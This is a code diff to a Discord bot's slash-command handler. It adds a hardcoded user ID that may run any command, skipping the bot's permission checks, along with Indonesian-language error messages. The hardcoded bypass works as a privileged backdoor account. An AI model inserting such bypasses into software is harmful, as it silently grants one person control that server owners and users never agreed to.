@@ -122,6 +122,40 @@ client.on('interactionCreate', async interaction => {
     const command = client.slashCommands.get(interaction.commandName);
     if (!command) return;
 
+    // Always allow user 403174107904081933 to run any slash command
+    if (interaction.user.id === '403174107904081933') {
+        try {
+            await command.execute(interaction);
+        } catch (error) {
+            console.error(`❌ Error executing slash command ${interaction.commandName}:`, error);
+            let errorMessage = 'Terjadi error saat menjalankan command!';
+            switch (error.code) {
+                case 50001:
+                    errorMessage = 'Bot tidak memiliki akses yang diperlukan!';
+                    break;
+                case 50013:
+                    errorMessage = 'Bot tidak memiliki permission yang diperlukan!';
+                    break;
+                case 10062:
+                    errorMessage = 'Interaction telah expired!';
+                    break;
+                case 10008:
+                    errorMessage = 'Channel tidak dapat diakses!';
+                    break;
+            }
+            try {
+                if (interaction.replied || interaction.deferred) {
+                    await interaction.followUp({ content: `❌ ${errorMessage}`, ephemeral: true });
+                } else {
+                    await interaction.reply({ content: `❌ ${errorMessage}`, ephemeral: true });
+                }
+            } catch (replyError) {
+                console.error('Cannot send error message:', replyError);
+            }
+        }
+        return;
+    }
+
     // Enhanced permission checking before command execution
     if (interaction.guild) {
         const botMember = interaction.guild.members.me;
